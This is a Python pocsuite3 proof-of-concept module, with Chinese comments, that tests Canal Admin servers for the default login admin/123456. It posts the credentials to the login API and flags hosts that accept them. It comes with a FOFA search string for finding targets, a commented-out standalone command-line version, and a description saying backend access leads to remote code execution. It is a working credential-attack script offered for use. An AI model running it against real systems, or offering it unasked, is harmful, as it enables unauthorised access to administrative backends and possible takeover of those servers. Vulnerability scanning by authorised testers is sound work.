from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
import json
# 关于类的继承
class Canal_Admin(POCBase):
    # fofa语句: title="任务调度中心"
    vulID = "1231312"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "yuema"  # PoC作者的大名
    vulDate = "2022-7-10"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-10"  # 编写 PoC 的日期
    updateDate = "2022-7-10"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "Canal Admin 后台存在弱口令漏洞 PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "Canal Admin"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """Canal Admin后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        full_url = f"{self.url.strip()}/api/v1/user/login"
        headers = {"Accept": "application/json, text/plain, */*",
                                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
                                 "Content-Type": "application/json;charset=UTF-8", "Origin": "http://8.210.222.77:8089",
                                 "Referer": "http://8.210.222.77:8089/", "Accept-Encoding": "gzip, deflate",
                                 "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        data = {"password": "123456", "username": "admin"}
        result = []
        try:
            response = requests.post(full_url,json=data,headers=headers,verify=False, timeout=5, allow_redirects=False)
            response1 = json.loads(response.text)
            if "code" in response.text:
                if response1.get("code") == 20000:
                    print(f"[+]{self.url} 存在弱口令")
                    result.append(self.url)
                else:
                    print(f"[-]{self.url} 不存在弱口令")
            else:
                print(f"{self.url}可能不是Canal Admin")
        except Exception as e:
            print(f"{self.url}请求失败")
            print(e)
        finally:
            return result

        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(Canal_Admin)










# import argparse
# import textwrap
# import requests
# import sys
# import json
# requests.packages.urllib3.disable_warnings()
#
# def main(url):
#     full_url = f"{url}/api/v1/user/login"
#     headers = {"Accept": "application/json, text/plain, */*",
#                      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
#                      "Content-Type": "application/json;charset=UTF-8", "Origin": "http://8.210.222.77:8089",
#                      "Referer": "http://8.210.222.77:8089/", "Accept-Encoding": "gzip, deflate",
#                      "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
#     data = {"password": "123456", "username": "admin"}
#     try:
#         response = requests.post(full_url,json=data,headers=headers,verify=False, timeout=5, allow_redirects=False)
#         response1 = json.loads(response.text)
#     except Exception:
#         print(f"{url}请求失败")
#     if "code" in response.text:
#         if response1.get("code") == 20000:
#             print(f"[+]{url} 存在弱口令")
#         else:
#             print(f"[-]{url} 不存在弱口令")
#     else:
#         print(f"{url}可能不是Canal Admin")
#
# if __name__ == '__main__':
#     banner = '''
#    \_   ___ \_____    ____ _____  |  |     /  _  \    __| _/_____ |__| ____
# /    \  \/\__  \  /    \\__  \ |  |    /  /_\  \  / __ |/     \|  |/    \
# \     \____/ __ \|   |  \/ __ \|  |__ /    |    \/ /_/ |  Y Y  \  |   |  \
#  \______  (____  /___|  (____  /____/ \____|__  /\____ |__|_|  /__|___|  /
#         \/     \/     \/     \/               \/      \/     \/        \/
#                                                               version: 0.0.1
#                                                               author:  yuema
#         '''
#     print(banner)
#     parser =  argparse.ArgumentParser(description="Canal Admin 弱口令poc",
#                                      formatter_class=argparse.RawDescriptionHelpFormatter,
#                                      epilog=textwrap.dedent('''example:
#         python3 Canal_Admin.py -u http://192.168.1.108
#         '''))
#
#     parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
#
#     args = parser.parse_args()
#
#     main(args.url.strip())




















